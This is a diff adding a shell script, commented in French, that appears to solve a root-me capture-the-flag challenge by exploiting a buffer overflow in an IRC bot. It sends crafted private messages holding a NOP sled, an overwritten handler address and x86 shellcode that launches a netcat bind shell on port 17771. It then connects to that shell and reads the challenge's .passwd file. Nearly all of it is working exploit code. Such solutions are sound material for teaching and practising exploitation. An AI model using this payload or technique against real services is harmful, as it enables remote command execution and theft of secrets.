@@ -1,0 +1,30 @@
+#il faut reecrire les handler dans Handler list via les private message
+#le premier prend l'adresse du buffer, le second met un script shell (/bin/nc -le /bin/sh -vp 17771) et le dernier appele ce script shell
+
+USER="Cacahuete"
+IRC_SERVER="irc.root-me.org"
+IRC_PORT=6667
+CHANNEL="Pown3dBot"
+
+MSG=`python -c 'print "!" + "A"*39 + "\x90"*100 + "\x2f\xb1\x04\x08PRIVMSG"'`
+MSG1=`python -c 'print "!" + "\x90"*35 + "AAAA" + "\x90"*6 + "\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80" + "PRIVMSG"'`
+MSG2=`python -c 'print "!hey "'`
+
+(
+echo NICK $USER
+echo USER $USER 8 * : $USER
+sleep 2
+echo "JOIN #root-me_challenge"
+sleep 2
+echo "PRIVMSG $CHANNEL" $MSG
+sleep 2
+echo "PRIVMSG $CHANNEL" $MSG1
+sleep 2
+echo "PRIVMSG $CHANNEL" $MSG2
+sleep 2
+echo "QUIT"
+) | nc $IRC_SERVER $IRC_PORT
+
+nc 127.0.0.1 17771
+cd /challenge/app-systeme/ch31
+cat .passwd
